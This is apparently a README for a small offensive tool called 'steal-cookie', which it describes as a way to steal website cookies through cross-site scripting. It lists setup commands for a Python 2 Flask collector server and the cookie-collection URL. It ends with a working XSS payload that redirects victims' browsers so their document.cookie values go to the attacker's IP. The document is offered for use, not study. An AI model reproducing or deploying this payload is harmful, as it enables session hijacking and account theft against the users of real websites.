# steal-cookie
steal cookies from websites using xss :)

# Requirements :
- python2
- Flask module

# install requirements (Linux) :

````
$ apt install python2
````

````
$ pip install flask
````


# Run It :
 

````
 $ python2 xss.py
 ````
 
# Cookie Path :


````http://YOUR_IP/cookie?cookie=COOKIE```` 
 

# Payload :
  
  ````
  "><script>document.location="http://YOUR_IP/cookie?cookie=" + document.cookie </script>
  ````
